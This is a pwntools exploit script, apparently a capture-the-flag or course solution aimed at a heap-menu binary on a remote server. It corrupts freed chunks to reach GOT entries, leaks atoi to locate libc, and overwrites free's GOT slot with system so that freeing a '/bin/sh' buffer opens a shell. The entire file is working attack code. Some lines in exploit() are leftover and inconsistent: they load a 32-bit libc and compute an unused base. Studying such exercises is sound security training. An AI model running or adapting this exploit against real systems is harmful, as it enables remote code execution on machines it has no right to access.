#!/usr/bin/env python3

from pwn import *

HOST = args.HOST if args.HOST else "6447.lol"
PORT = args.PORT if args.PORT else 8003

context.arch = "amd64"
context.log_level = 'info'

gdbscript = '''
continue
'''.format(**locals())

######################################
######## Establish Connection ########
######################################

def connect_binary():
    global P, E, LIBC
    
    # with context.local(log_level='error'):
    if args.REMOTE:
        P = remote(HOST, PORT)
    elif args.GDB:
        P = gdb.debug([f"{__file__.replace('_sol.py', '')}"], gdbscript=gdbscript)
    else:
        P = process(f"{__file__.replace('_sol.py', '')}")

    E = ELF(f"{__file__.replace('_sol.py', '')}")
    LIBC = ELF('/lib/x86_64-linux-gnu/libc.so.6')

######################################
############## Exploit ###############
######################################

def create():
    P.recvuntil(b"): ", drop=True)
    P.sendline(b'c')

def delete(id):
    P.recvuntil(b"): ", drop=True)
    P.sendline(b'd')
    P.recvuntil(b"id: ", drop=True)
    P.sendline(id)

def set(id, input):
    P.recvuntil(b"): ", drop=True)
    P.sendline(b's')
    P.recvuntil(b"id: ", drop=True)
    P.sendline(id)
    P.recvuntil(b"question: ", drop=True)
    P.sendline(input)

def ask(id):
    P.recvuntil(b"): ", drop=True)
    P.sendline(b'a')
    P.recvuntil(b"id: ", drop=True)
    P.sendline(id)
    P.recvuntil(b"answer perhaps: '")
    answer = u64(P.recvuntil(b"'", drop=True).ljust(8, b'\x00'))
    return answer

def exploit():
    libc = ELF("/lib/i386-linux-gnu/libc.so.6", checksec=False)
    got_printf = E.got['printf']
    libc_printf = libc.symbols['printf']
    libc.address = got_printf - libc_printf
    system = libc.symbols['system']

    create() # 0
    set(b'0', b'/bin/sh\0')
    create() # 1
    create() # 2
    create() # 3
    create() # 4
    delete(b'3')
    delete(b'4')
    set(b'3', p64(0x0) + b'A' * 32 + p64(0x31) + p64(E.got['atoi']))
    create() # 5
    leak = ask(b'5')
    log.info(f'ATOI @ {hex(leak)}')
    LIBC.address = leak - LIBC.symbols['atoi'] # set libc base
    delete(b'2')
    set(b'1', p64(0x0) + b'A' * 32 + p64(0x31) + p64(E.got['free'] - 8))
    create() # 6
    before_free = ask(b'6')
    log.info(f'before free @ {hex(before_free)}')
    set(b'6', p64(before_free) + p64(LIBC.symbols['system']) + p64(LIBC.symbols['putchar']))
    delete(b'0')
    P.interactive()

if __name__ == '__main__':
    connect_binary()
    exploit()
